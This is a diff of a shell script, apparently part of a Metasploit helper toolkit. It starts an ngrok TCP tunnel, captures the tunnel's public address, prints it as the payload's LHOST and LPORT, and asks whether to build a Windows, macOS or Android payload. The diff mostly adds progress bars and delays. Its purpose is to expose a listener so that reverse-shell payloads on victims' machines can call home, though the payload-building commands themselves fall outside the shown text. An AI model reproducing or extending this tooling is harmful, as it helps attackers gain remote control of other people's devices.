@@ -43,28 +43,62 @@ read ngrok_choice
 if [ $ngrok_choice = "y" ]; then
 	~/msf/script/check_ngrok.sh
 	pkill ngrok
+	pkill ngrok
+	pkill ngrok
+	pkill ngrok
 	echo "NGROK RANDOM SERVER TCP IS STARTING..."
 	ngrok tcp 5656 > /dev/null &
 fi
+#Waiting for ngrok
+{
+        i=0
+        while [ $i -ne 100 ]
+        do
+                i=$(($i+1))
+                echo "$i"
+                sleep 0.02
+        done
+} | whiptail --backtitle "Vakandi Useful Tools" --title "Starting NGROK server" --gauge "Please wait until ngrok server has been checked" 8 50 0
+
 echo "$(curl -s localhost:4040/api/tunnels | grep -Eo "(tcp)://[a-zA-Z0-9./?=_%:-]*" | sed "s#tcp://##g")" > $TEMPFILE
-echo "The file\033[1;32m .temp_ip_ngrok-tcp.txt \033[0m has been created to store the IP & PORT address of your ngrok server"
 if [ $ngrok_choice = "n" ] && [ -z $(grep '[^[:space:]]' $TEMPFILE) ]; then
+	echo "NGROK RANDOM SERVER TCP IS STARTING..."
 	ngrok tcp 5656 > /dev/null &
 	~/msf/script/check_ngrok.sh
 else
 	continue
 fi
-sleep 4.5
+#Waiting for ngrok
+{
+        i=0
+        while [ $i -ne 100 ]
+        do
+                i=$(($i+1))
+                echo "$i"
+                sleep 0.03
+        done
+} | whiptail --backtitle "Vakandi Useful Tools" --title "Checking if the server is started and stable..." --gauge "Please wait until ngrok server has been checked" 8 50 0
+#Waiting for ngrok
 if [ -z $(grep '[^[:space:]]' $TEMPFILE) ]; then
 	echo "\033[1;32m \nNGROK SERVER FAILED TO START..\nEXITING...\033[0m"
 	exit
 fi
+
+sleep 1
+echo "$(curl -s localhost:4040/api/tunnels | grep -Eo "(tcp)://[a-zA-Z0-9./?=_%:-]*" | sed "s#tcp://##g")" > $TEMPFILE
+echo "The file\033[1;32m .temp_ip_ngrok-tcp.txt \033[0m has been created to store the IP & PORT address of your ngrok server"
+sleep 1
 echo "\033[1;32m \nPayload Options:\033[0m"
+sleep 1
 echo "LHOST PAYLOAD: \033[1;34m$IP\033[0m \nLPORT PAYLOAD: \033[1;34m$PORT\033[0m"
+sleep 1
 
 echo "\033[1;33m:::: WHICH PLATFORM YOU WANT THE PAYLOAD TO RUN ON?\033[0m"
+sleep 0.5
 echo "\033[1;33m:::: Type "w" for WINDOWS(.exe)\033[0m"
+sleep 0.5
 echo "\033[1;33m:::: Type "m" for MACOSX(.app)\033[0m"
+sleep 0.5
 echo "\033[1;33m:::: Type "a" for ANDROID(.apk)\033[0m"
 read payload_choice
 if [ $payload_choice = "w" ]; then
